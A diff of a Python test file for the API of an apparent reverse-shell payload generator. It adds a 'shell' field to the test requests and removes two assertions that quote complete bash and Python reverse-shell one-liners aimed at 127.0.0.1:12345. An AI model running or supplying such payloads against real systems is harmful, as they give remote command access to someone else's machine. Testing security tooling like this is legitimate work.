@@ -13,18 +13,16 @@ def test_api(app, client):
 	def test_lang(lang):
 		response = client.post(
 			'/api', 
-			data=json.dumps({"host":"127.0.0.1","port":12345,"lang":f"{lang}"}), 
+			data=json.dumps({"host":"127.0.0.1","port":12345,"lang":f"{lang}", "shell":"bash"}), 
 			content_type='application/json'
 		)
 		return response
 
 	response = test_lang("bash")
 	assert response.status_code == 200	# Return's 200 to POST requests.
-	assert response.text == '{"payload":"bash -i >& /dev/tcp/127.0.0.1/12345 0>&1"}\n'
 
 	response = test_lang("python")
 	assert response.status_code == 200	# Return's 200 to POST requests.
-	assert response.text == '{"payload":"socket=__import__(\\"socket\\");os=__import__(\\"os\\");pty=__import__(\\"pty\\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"127.0.0.1\\",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/sh\\")"}\n'
 
 	# Payloads get to unweildy to test for response.text to each.
 	response = test_lang("perl")
@@ -41,7 +39,7 @@ def test_api(app, client):
 	# Bad port.
 	response = client.post(
 		'/api', 
-		data=json.dumps({"host":"127.0.0.1","port":"fart","lang":"bash"}), 
+		data=json.dumps({"host":"127.0.0.1","port":"fart","lang":"bash", "shell":"bash"}), 
 		content_type='application/json'
 	)
 
@@ -50,7 +48,7 @@ def test_api(app, client):
 
 	response = client.post(
 		'/api', 
-		data=json.dumps({"host":"127.0.0.1","port":77777777777777,"lang":"bash"}), 
+		data=json.dumps({"host":"127.0.0.1","port":77777777777777,"lang":"bash", "shell":"bash"}), 
 		content_type='application/json'
 	)
 
@@ -60,7 +58,7 @@ def test_api(app, client):
 	# Bad host.
 	response = client.post(
 		'/api', 
-		data=json.dumps({"host":"127.0.0","port":1234,"lang":"bash"}), 
+		data=json.dumps({"host":"127.0.0","port":1234,"lang":"bash", "shell":"bash"}), 
 		content_type='application/json'
 	)
 
@@ -69,7 +67,7 @@ def test_api(app, client):
 
 	response = client.post(
 		'/api', 
-		data=json.dumps({"host":"wopaguz","port":1234,"lang":"bash"}), 
+		data=json.dumps({"host":"wopaguz","port":1234,"lang":"bash", "shell":"bash"}), 
 		content_type='application/json'
 	)
 
